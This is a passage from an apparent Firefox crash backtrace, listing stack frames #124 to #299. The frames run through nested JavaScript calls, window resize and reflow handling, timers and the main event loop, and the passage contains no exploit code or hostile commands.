0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #124 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #125 0x7fce4cf1977f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #126 0x7fce4cf1977f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #127 0x7fce4cefe93d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #128 0x7fce4cf399df in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #129 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #130 0x7fce4cca869c in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #131 0x7fce4cc77ccf in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #132 0x7fce4cc857bf in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #133 0x7fce4cc87f6e in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #134 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #135 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #136 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #137 0x7fce4ca0ac7d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #138 0x7fce46593bcf in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:259:37 #139 0x7fce46fc430a in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:361:12 #140 0x7fce46fc430a in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #141 0x7fce46f8e6ad in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1134:16 #142 0x7fce46f900d7 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1287:17 #143 0x7fce46f7ae36 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:380:5 #144 0x7fce46f7e4c8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 #145 0x7fce4920a5f3 in PresShell::FireResizeEvent() /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:2038:5 #146 0x7fce492201a8 in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4122:7 #147 0x7fce4920e7e6 in FlushPendingNotifications /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4054:3 #148 0x7fce4920e7e6 in HandlePostedReflowCallbacks /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4022 #149 0x7fce4920e7e6 in PresShell::DidDoReflow(bool) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:9217 #150 0x7fce4920b1ad in PresShell::ResizeReflowIgnoreOverride(int, int, int, int) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:1974:7 #151 0x7fce487e5bb0 in DoSetWindowDimensions /home/worker/workspace/build/src/view/nsViewManager.cpp:192:7 #152 0x7fce487e5bb0 in nsViewManager::SetWindowDimensions(int, int, bool) /home/worker/workspace/build/src/view/nsViewManager.cpp:228 #153 0x7fce4917ffbf in nsDocumentViewer::SetBoundsWithFlags(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, unsigned int) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2005:5 #154 0x7fce4918012b in nsDocumentViewer::SetBoundsWithFlags(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, unsigned int) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2019:5 #155 0x7fce49f0812c in SetPositionAndSize /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5999:19 #156 0x7fce49f0812c in non-virtual thunk to nsDocShell::SetPositionAndSize(int, int, int, int, unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5985 #157 0x7fce4511d224 in nsFrameLoader::UpdateBaseWindowPositionAndSize(nsSubDocumentFrame*) /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:2500:5 #158 0x7fce4511cc7e in nsFrameLoader::UpdatePositionAndSize(nsSubDocumentFrame*) /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:2472:3 #159 0x7fce4951fc6d in ReflowFinished /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:817:5 #160 0x7fce4951fc6d in non-virtual thunk to nsSubDocumentFrame::ReflowFinished() /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:812 #161 0x7fce4920e753 in HandlePostedReflowCallbacks /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4013:12 #162 0x7fce4920e753 in PresShell::DidDoReflow(bool) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:9217 #163 0x7fce4920b1ad in PresShell::ResizeReflowIgnoreOverride(int, int, int, int) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:1974:7 #164 0x7fce487e5bb0 in DoSetWindowDimensions /home/worker/workspace/build/src/view/nsViewManager.cpp:192:7 #165 0x7fce487e5bb0 in nsViewManager::SetWindowDimensions(int, int, bool) /home/worker/workspace/build/src/view/nsViewManager.cpp:228 #166 0x7fce4917ffbf in nsDocumentViewer::SetBoundsWithFlags(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, unsigned int) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2005:5 #167 0x7fce49f0812c in SetPositionAndSize /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5999:19 #168 0x7fce49f0812c in non-virtual thunk to nsDocShell::SetPositionAndSize(int, int, int, int, unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5985 #169 0x7fce4a05c034 in WindowResized /home/worker/workspace/build/src/xpfe/appshell/nsWebShellWindow.cpp:298:5 #170 0x7fce4a05c034 in non-virtual thunk to nsWebShellWindow::WindowResized(nsIWidget*, int, int) /home/worker/workspace/build/src/xpfe/appshell/nsWebShellWindow.cpp:294 #171 0x7fce488a5d62 in DispatchResized /home/worker/workspace/build/src/widget/gtk/nsWindow.cpp:550:9 #172 0x7fce488a5d62 in nsWindow::Resize(double, double, bool) /home/worker/workspace/build/src/widget/gtk/nsWindow.cpp:1140 #173 0x7fce4a071c2c in nsXULWindow::SetSize(int, int, bool) /home/worker/workspace/build/src/xpfe/appshell/nsXULWindow.cpp:624:17 #174 0x7fce44d51f3e in nsGlobalWindow::ResizeByOuter(int, int, mozilla::ErrorResult&, bool) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:7965:12 #175 0x7fce4633899d in mozilla::dom::WindowBinding::resizeBy(JSContext*, JS::Handle<JSObject*>, nsGlobalWindow*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:3467:3 #176 0x7fce4632ff69 in mozilla::dom::WindowBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:15158:13 #177 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #178 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #179 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #180 0x7fce4cca869c in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #181 0x7fce4cc77ccf in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #182 0x7fce4cc857bf in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #183 0x7fce4cc87f6e in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #184 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #185 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #186 0x7fce4cf1977f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #187 0x7fce4cf1977f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #188 0x7fce4cefe93d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #189 0x7fce4cf399df in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #190 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #191 0x7fce4ca0ac7d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #192 0x7fce466d7769 in mozilla::dom::Function::Call(JSContext*, JS::Handle<JS::Value>, nsTArray<JS::Value> const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/FunctionBinding.cpp:36:8 #193 0x7fce44d87167 in Call<nsCOMPtr<nsISupports> > /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/FunctionBinding.h:70:12 #194 0x7fce44d87167 in nsGlobalWindow::RunTimeoutHandler(mozilla::dom::Timeout*, nsIScriptContext*) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:13029 #195 0x7fce44d88f00 in nsGlobalWindow::RunTimeout(mozilla::dom::Timeout*) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:13308:32 #196 0x7fce44f68972 in mozilla::dom::(anonymous namespace)::TimerCallback(nsITimer*, void*) /home/worker/workspace/build/src/dom/base/Timeout.cpp:63:3 #197 0x7fce42435039 in nsTimerImpl::Fire(int) /home/worker/workspace/build/src/xpcom/threads/nsTimerImpl.cpp:479:7 #198 0x7fce4240948c in nsTimerEvent::Run() /home/worker/workspace/build/src/xpcom/threads/TimerThread.cpp:285:3 #199 0x7fce424254c2 in mozilla::ThrottledEventQueue::Inner::ExecuteRunnable() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:161:15 #200 0x7fce42424e8f in mozilla::ThrottledEventQueue::Inner::Executor::Run() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:74:7 #201 0x7fce42417cab in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #202 0x7fce42499dec in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #203 0x7fce4872fa74 in mozilla::dom::XMLHttpRequestMainThread::SendInternal(mozilla::dom::XMLHttpRequestMainThread::RequestBodyBase const*) /home/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:2956:14 #204 0x7fce4874bfb3 in mozilla::dom::XMLHttpRequestMainThread::Send(JSContext*, nsAString_internal const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.h:380:13 #205 0x7fce463eb4bb in mozilla::dom::XMLHttpRequestBinding::send(JSContext*, JS::Handle<JSObject*>, mozilla::dom::XMLHttpRequest*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/XMLHttpRequestBinding.cpp:781:7 #206 0x7fce46baa5f9 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2904:13 #207 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #208 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #209 0x7fce4cf1977f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #210 0x7fce4cf1977f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #211 0x7fce4cefe93d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #212 0x7fce4cf399df in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #213 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #214 0x7fce4cca869c in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #215 0x7fce4cc77ccf in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #216 0x7fce4cc857bf in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #217 0x7fce4cc87f6e in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #218 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #219 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #220 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #221 0x7fce4ca0ac7d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #222 0x7fce46593bcf in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:259:37 #223 0x7fce46fc430a in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:361:12 #224 0x7fce46fc430a in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #225 0x7fce46f8e6ad in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1134:16 #226 0x7fce46f900d7 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1287:17 #227 0x7fce46f7ae36 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:380:5 #228 0x7fce46f7e4c8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 #229 0x7fce4920a5f3 in PresShell::FireResizeEvent() /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:2038:5 #230 0x7fce492201a8 in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4122:7 #231 0x7fce4920e7e6 in FlushPendingNotifications /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4054:3 #232 0x7fce4920e7e6 in HandlePostedReflowCallbacks /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4022 #233 0x7fce4920e7e6 in PresShell::DidDoReflow(bool) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:9217 #234 0x7fce4920b1ad in PresShell::ResizeReflowIgnoreOverride(int, int, int, int) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:1974:7 #235 0x7fce487e5bb0 in DoSetWindowDimensions /home/worker/workspace/build/src/view/nsViewManager.cpp:192:7 #236 0x7fce487e5bb0 in nsViewManager::SetWindowDimensions(int, int, bool) /home/worker/workspace/build/src/view/nsViewManager.cpp:228 #237 0x7fce4917ffbf in nsDocumentViewer::SetBoundsWithFlags(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, unsigned int) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2005:5 #238 0x7fce4918012b in nsDocumentViewer::SetBoundsWithFlags(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, unsigned int) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2019:5 #239 0x7fce49f0812c in SetPositionAndSize /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5999:19 #240 0x7fce49f0812c in non-virtual thunk to nsDocShell::SetPositionAndSize(int, int, int, int, unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5985 #241 0x7fce4511d224 in nsFrameLoader::UpdateBaseWindowPositionAndSize(nsSubDocumentFrame*) /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:2500:5 #242 0x7fce4511cc7e in nsFrameLoader::UpdatePositionAndSize(nsSubDocumentFrame*) /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:2472:3 #243 0x7fce4951fc6d in ReflowFinished /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:817:5 #244 0x7fce4951fc6d in non-virtual thunk to nsSubDocumentFrame::ReflowFinished() /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:812 #245 0x7fce4920e753 in HandlePostedReflowCallbacks /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4013:12 #246 0x7fce4920e753 in PresShell::DidDoReflow(bool) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:9217 #247 0x7fce4920b1ad in PresShell::ResizeReflowIgnoreOverride(int, int, int, int) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:1974:7 #248 0x7fce487e5bb0 in DoSetWindowDimensions /home/worker/workspace/build/src/view/nsViewManager.cpp:192:7 #249 0x7fce487e5bb0 in nsViewManager::SetWindowDimensions(int, int, bool) /home/worker/workspace/build/src/view/nsViewManager.cpp:228 #250 0x7fce4917ffbf in nsDocumentViewer::SetBoundsWithFlags(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, unsigned int) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2005:5 #251 0x7fce49f0812c in SetPositionAndSize /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5999:19 #252 0x7fce49f0812c in non-virtual thunk to nsDocShell::SetPositionAndSize(int, int, int, int, unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5985 #253 0x7fce4a05c034 in WindowResized /home/worker/workspace/build/src/xpfe/appshell/nsWebShellWindow.cpp:298:5 #254 0x7fce4a05c034 in non-virtual thunk to nsWebShellWindow::WindowResized(nsIWidget*, int, int) /home/worker/workspace/build/src/xpfe/appshell/nsWebShellWindow.cpp:294 #255 0x7fce488a5d62 in DispatchResized /home/worker/workspace/build/src/widget/gtk/nsWindow.cpp:550:9 #256 0x7fce488a5d62 in nsWindow::Resize(double, double, bool) /home/worker/workspace/build/src/widget/gtk/nsWindow.cpp:1140 #257 0x7fce4a071c2c in nsXULWindow::SetSize(int, int, bool) /home/worker/workspace/build/src/xpfe/appshell/nsXULWindow.cpp:624:17 #258 0x7fce44d51f3e in nsGlobalWindow::ResizeByOuter(int, int, mozilla::ErrorResult&, bool) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:7965:12 #259 0x7fce4633899d in mozilla::dom::WindowBinding::resizeBy(JSContext*, JS::Handle<JSObject*>, nsGlobalWindow*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:3467:3 #260 0x7fce4632ff69 in mozilla::dom::WindowBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:15158:13 #261 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #262 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #263 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #264 0x7fce4cca869c in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #265 0x7fce4cc77ccf in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #266 0x7fce4cc857bf in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #267 0x7fce4cc87f6e in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #268 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #269 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #270 0x7fce4cf1977f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #271 0x7fce4cf1977f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #272 0x7fce4cefe93d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #273 0x7fce4cf399df in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #274 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #275 0x7fce4ca0ac7d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #276 0x7fce466d7769 in mozilla::dom::Function::Call(JSContext*, JS::Handle<JS::Value>, nsTArray<JS::Value> const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/FunctionBinding.cpp:36:8 #277 0x7fce44d87167 in Call<nsCOMPtr<nsISupports> > /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/FunctionBinding.h:70:12 #278 0x7fce44d87167 in nsGlobalWindow::RunTimeoutHandler(mozilla::dom::Timeout*, nsIScriptContext*) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:13029 #279 0x7fce44d88f00 in nsGlobalWindow::RunTimeout(mozilla::dom::Timeout*) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:13308:32 #280 0x7fce44f68972 in mozilla::dom::(anonymous namespace)::TimerCallback(nsITimer*, void*) /home/worker/workspace/build/src/dom/base/Timeout.cpp:63:3 #281 0x7fce42435039 in nsTimerImpl::Fire(int) /home/worker/workspace/build/src/xpcom/threads/nsTimerImpl.cpp:479:7 #282 0x7fce4240948c in nsTimerEvent::Run() /home/worker/workspace/build/src/xpcom/threads/TimerThread.cpp:285:3 #283 0x7fce424254c2 in mozilla::ThrottledEventQueue::Inner::ExecuteRunnable() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:161:15 #284 0x7fce42424e8f in mozilla::ThrottledEventQueue::Inner::Executor::Run() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:74:7 #285 0x7fce42417cab in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #286 0x7fce42499dec in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #287 0x7fce43252d5f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #288 0x7fce431c48b8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #289 0x7fce431c48b8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #290 0x7fce431c48b8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 #291 0x7fce48865c6f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #292 0x7fce4a8e4071 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19 #293 0x7fce4aa7b387 in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4488:10 #294 0x7fce4aa7cafd in XREMain::XRE_main(int, char**, nsXREAppData const*) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4621:8 #295 0x7fce4aa7d9bc in XRE_main /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4712:16 #296 0x4df91a in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:282:10 #297 0x4df91a in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:415 #298 0x7fce5de8382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #299 0x41ba88 in _start 